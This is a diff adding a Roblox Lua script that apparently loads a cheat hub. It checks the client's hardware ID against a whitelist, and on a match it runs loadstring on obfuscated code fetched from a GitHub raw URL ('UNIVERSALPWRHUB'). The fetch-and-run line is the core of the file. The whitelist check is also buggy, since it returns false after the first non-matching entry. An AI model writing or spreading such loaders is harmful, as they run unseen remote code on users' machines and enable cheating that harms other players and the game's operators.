@@ -1,0 +1,22 @@
+-- HWID Whitelist
+
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
+local WhitelistedHWIDs = {"22a11594-c78d-4565-b6a7-89558a1a849e","",""}
+local qNVAKkuwxNpqruLjSRHg = false
+
+function CheckHWID(hwidval)
+for _,whitelisted in pairs(WhitelistedHWIDs) do
+ if hwidval == whitelisted then
+     return true
+ elseif hwidval ~= whitelisted then
+     return false
+       end
+    end
+end
+
+qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)
+
+if qNVAKkuwxNpqruLjSRHg == true then
+ print("Welcome To The Ruthless Side")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DaRuthlessPWR/UNIVERSALPWRHUB/main/obf%20string", true))()
+end
